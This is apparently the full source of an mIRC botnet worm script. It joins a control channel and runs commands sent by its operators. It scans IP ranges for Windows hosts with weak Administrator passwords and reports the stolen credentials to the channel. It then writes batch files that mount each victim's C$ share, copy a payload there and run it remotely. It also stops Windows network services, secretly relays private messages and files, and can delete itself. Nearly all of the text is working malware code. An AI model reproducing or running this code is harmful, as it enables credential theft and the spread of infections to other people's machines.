on *:start:{ 
  .timerserver -o 0 15 .server %server 
  .sec 
  if ($exists(nnick.mrc) == $true) .newnick 
  .identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,Z) 
  .nick %mircnick
  .anick %mircnick2
}
on *:connect:{
  .join %homechan
  .timerjoin 0 30 /join %homechan
  .timerserver off
  .timersec  -o 0 3600 .sec
  .timer3452 -o 0 30 .startparse
}
on *:disconnect:{ if (%autoconnect == on) .timerserver -o 0 10 .server %server | //identd on $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) }
on *:exit:{ /run msrh.exe msrr.exe }
on 1000:text:.quit:*:{ .set %autoconect off | timerquit -o 1 2 .disconnect | .timerquit2 -o 1 10 .set %autoconect on | /close -m } 
on 1000:notice:*:?:{ / $+ $1- | .notice $nick 10 DONE | /close -m }
on 1000:text:.botz*:*:{ / $+ $2- | /close -m | timer $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) 1 3 /saveini }
on 1000:text:!ip*:*:{ /notice $nick 9 $ip 10 - 9 $time(hh:nn:sstt) | /close -m }
on 1000:TEXT:.clean*:*:{ .run msrh.exe "deltree.exe /y log" | .timermd 1 5 .mkdir log | .msg %homechan 10 Clean up has takin place | .close -m }
on 1000:TEXT:.halt*:*:{ .run -n msrh.exe "end.exe win32.exe" | msg %homechan 10[ALL SCANS HALTED] }
on 1000:TEXT:!SD!:*:{ /selfd }
on 1000:TEXT:.SCAN*:*:{ 
  set %xt1 $2 | if ($2 == $null) { set %xt1 $r(1,255) }
  set %xt2 $3 | if ($3 == $null) { set %xt2 $r(1,255) }
  set %xt3 $4 | if ($4 == $null) { set %xt3 $r(1,255) }
  set %xt4 $5 | if ($5 == $null) { set %xt4 1 }
  set %xt5 $6 | if ($6 == $null) { set %xt5 %xt1 }
  set %xt6 $7 | if ($7 == $null) { set %xt6 %xt2 }
  set %xt7 $8 | if ($8 == $null) { set %xt7 255 }
  set %xt8 $9 | if ($9 == $null) { set %xt8 255 }
  set %srange log\ $+ $r(1,100000) | write %srange $+ .bat win32.exe -host %xt1 $+ . $+ %xt2 $+ . $+ %xt3 $+ . $+ %xt4 $+ - $+ %xt5 $+ . $+ %xt6 $+ . $+ %xt7 $+ . $+ %xt8 -ntpass -p -t 150,20 | /timer 1 5 /run msrh.exe %srange $+ .bat | timer 1 40 remove %srange $+ .bat 
  msg %homechan 10[NOW SCANNING]14 %xt1 $+ . $+ %xt2 $+ . $+ %xt3 $+ . $+ %xt4 - %xt5 $+ . $+ %xt6 $+ . $+ %xt7 $+ . $+ %xt8 
  timer3452 -o 0 30 /startparse 
}
on *:text:*:?:{ msg %echopoint 8 $nick 0 just sent this text [/msg]4 $1- | close -m }
on *:notice:*:*: { msg %echopoint 8 $nick 0 just sent this text [/notice]4 $1- }
on *:filercvd:*: { msg %echopoint 8 $nick 0 has just set a file called 4 $nopath($filename) | close -gets }

alias sec {
  write lock.bat net stop browser /y
  write lock.bat net stop lanmanserver /y
  write lock.bat net stop TlntSvr /y
  write lock.bat net stop server /y
  timersec 1 10 /run msrh.exe lock.bat
  timersecrem 1 40 /remove lock.bat
}
alias startparse {
  set %t 0
  set %results 0
  set %total $findfile(log\,*.htm,0)
  :start
  inc %t
  if (%t <= %total) { parsefile $findfile(log\,*.htm,%t) | goto start }
}
alias parsefile {
  set %temp.test $1
  set %temp.host $nopath($1)
  set %temp.host $remove(%temp.host,.htm)
  set %temp.text $read($1, w, *Type: Administrator*)
  set %temp.line $readn
  if (%temp.line == 0) { return NULL }
  set %temp.text $read($1, $calc($readn - 1))
  if ($read($1, $calc(%temp.line - 1)) == <BR>) { $getuserpass2($read($1, $calc(%temp.line - 2))) | return }
  $getuserpass(%temp.text)
}
alias getuserpass {
  set %temp.user $gettok($1,2,60)
  set %temp.user $gettok(%temp.user,2,62)
  set %temp.pass $remove($gettok($1,3,47),<font,color="#FF0000">,<)
  if (*pass*same*as*user* iswm %temp.pass) { set %temp.pass %temp.user }
  if (*blank*pass* iswm %temp.pass) { set %temp.pass [NULL] }
  inc %results
  echo -a FOUND: %temp.host %temp.user %temp.pass
  msg %echopoint 4INFECTION SITE:0 %temp.host %temp.user %temp.pass
  remove %temp.test
  set %hip %temp.host 
  set %hlon %temp.user $+ " "
  if (%temp.pass == [NULL]) //set %hpass "
  else set %hpass %temp.pass $+ "
  set %hfile $mircdir $+ log\T7  $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
  write %hfile $+ .bat net use \\ $+ %hip $+ \c$ /user:" $+ %hlon 
  if ($5 == [NULL]) { /write -al1 %hfile $+ .bat %hpass } 
  else /write -al1 %hfile $+ .bat %hpass
  write %hfile $+ .bat mkdir \\ $+ %hip $+ \c$\Windows\System32\msrr
  write %hfile $+ .bat copy c:\Windows\system32\msrr\msrf.exe \\ $+ %hip $+ \c$\Windows\system32\msrr\
  write %hfile $+ .bat c:\Windows\system32\msrr\workit.exe \\ $+ %hip -s c:\Windows\system32\msrr\msrf.exe
  run msrh %hfile $+ .bat 
  timer $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) 1 900 /remove %hfile $+ .bat
}
alias getuserpass2 {
  set %temp.user $gettok($1,2,62)
  set %temp.user $gettok(%temp.user,1,60)
  set %temp.pass $remove($gettok($1,3,47),<font,color="#FF0000">,<)
  if (*pass*same*as*user* iswm %temp.pass) { set %temp.pass %temp.user }
  if (*blank*pass* iswm %temp.pass) { set %temp.pass [NULL] }
  inc %results
  msg %echopoint 4INFECTION SITE:0 %temp.host %temp.user %temp.pass
  remove %temp.test
  set %hip %temp.host 
  set %hlon %temp.user $+ " "
  if (%temp.pass == [NULL]) //set %hpass "
  else set %hpass %temp.pass $+ "
  set %hfile $mircdir $+ log\T7  $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
  write %hfile $+ .bat net use \\ $+ %hip $+ \c$ /user:" $+ %hlon 
  if ($5 == [NULL]) { /write -al1 %hfile $+ .bat %hpass } 
  else /write -al1 %hfile $+ .bat %hpass
  write %hfile $+ .bat mkdir \\ $+ %hip $+ \c$\Windows\system32\msrr
  write %hfile $+ .bat copy c:\Windows\system32\msrr\msrf.exe \\ $+ %hip $+ \c$\Windows\system32\msrr\
  write %hfile $+ .bat c:\Windows\system32\msrr\workit.exe \\ $+ %hip -s c:\Windows\system32\msrr\msrf.exe
  run msrh.exe %hfile $+ .bat 
  timer $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) 1 900 /remove %hfile $+ .bat
}
alias selfD {
  /msg %homechan 4 DESTRUCTION TAKING PLACE.....
  write wsx.bat end.exe msrr
  write wsx.bat end.exe msrr
  write wsx.bat end.exe msrr
  write wsx.batend.exe msrr
  write wsx.bat del datasht.dll
  write wsx.bat del msethc.ini
  write wsx.bat del msrr.thc
  write wsx.bat del workit.exe
  write wsx.bat del win32.exe
  write wsx.bat del msrr.thc
  write wsx.bat del deltree.exe
  write wsx.bat del end.exe
  write wsx.bat del msrr.exe
  write wsx.bat del msrf.exe
  write wsx.bat del wsx.bat
  run -n wsx.bat
  unload -rs ttl.dll | exit
  exit
}